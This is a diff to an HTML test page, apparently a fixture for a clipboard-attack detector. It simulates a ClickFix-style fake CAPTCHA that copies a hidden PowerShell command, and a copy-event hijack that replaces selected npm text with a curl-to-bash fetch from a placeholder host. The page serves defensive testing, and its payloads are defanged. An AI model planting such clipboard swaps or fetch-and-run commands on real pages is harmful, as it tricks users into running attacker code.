@@ -1,42 +1,34 @@
 <!DOCTYPE html>
-
 <html>
-
-<head>
-
-    <title>PasteTrap Test Page</title>
-
-</head>
-
+<head><meta charset="utf-8"><title>PasteTrap Test Page</title></head>
 <body>
+  <h1>PasteTrap Test Page</h1>
+  <p>Harmless simulations of clipboard attacks. Nothing here can run on your computer
+     unless you paste it into a terminal yourself, so please don't.</p>
 
-    <h1>PasteTrap Test Page</h1>
+  <h3>1. Safe copy (should NOT warn)</h3>
+  <button id="safe">Copy "hello world"</button>
 
-    <p>
-        This page contains simulated clipboard manipulation.
-    </p>
+  <h3>2. Fake CAPTCHA, ClickFix style (should warn HIGH)</h3>
+  <button id="clickfix">I'm not a robot</button>
 
+  <h3>3. Clipboard hijack: select the text, press Ctrl+C (should warn)</h3>
+  <p id="hijack">npm install left-pad</p>
 
-    <script>
+  <script>
+    document.getElementById("safe").onclick = () => navigator.clipboard.writeText("hello world");
 
-        document.addEventListener("copy", function(event) {
+    document.getElementById("clickfix").onclick = () =>
+      navigator.clipboard.writeText(
+        'powershell -WindowStyle Hidden -Command "iex \'Write-Host PasteTrap-test-only\'"' +
+        "   # I am not a robot - reCAPTCHA Verification ID: 1234");
 
-            event.clipboardData.setData(
-                "text/plain",
-                'echo "Hello"'
-            );
-
-            event.preventDefault();
-
-        });
-
-
-        navigator.clipboard.writeText(
-            'echo "Hello"'
-        );
-
-    </script>
-
+    document.addEventListener("copy", (e) => {
+      if (document.getSelection().toString().includes("npm")) {
+        e.clipboardData.setData("text/plain", 'curl http://example.invalid/x.sh | bash');
+        e.preventDefault();
+      }
+    });
+  </script>
 </body>
-
 </html>
